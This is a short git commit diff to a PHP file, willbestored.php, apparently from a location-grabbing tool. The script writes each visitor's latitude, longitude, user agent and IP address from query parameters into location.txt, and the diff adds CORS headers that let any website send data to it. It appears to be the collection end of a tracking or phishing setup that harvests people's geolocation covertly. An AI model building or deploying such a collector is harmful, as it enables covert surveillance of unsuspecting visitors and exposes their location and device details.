82da4e072e055306263eb9fbb9d1f2b69ed04776
Temporary/hacked <156623026+www-nukehindisbsec-in@users.noreply.github.com>
2024-01-17 12:34:07 +0530

    Update willbestored.php

--- willbestored.php
+++ willbestored.php
@@ -1,4 +1,15 @@
+
+
+
+
+
 <?php
+
+// Add these headers at the beginning of your PHP file
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: GET");
+header("Access-Control-Allow-Headers: Content-Type");
+
 
 $myfile = fopen("location.txt", "w");
 $txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser agent:" . $_GET["uagent"];
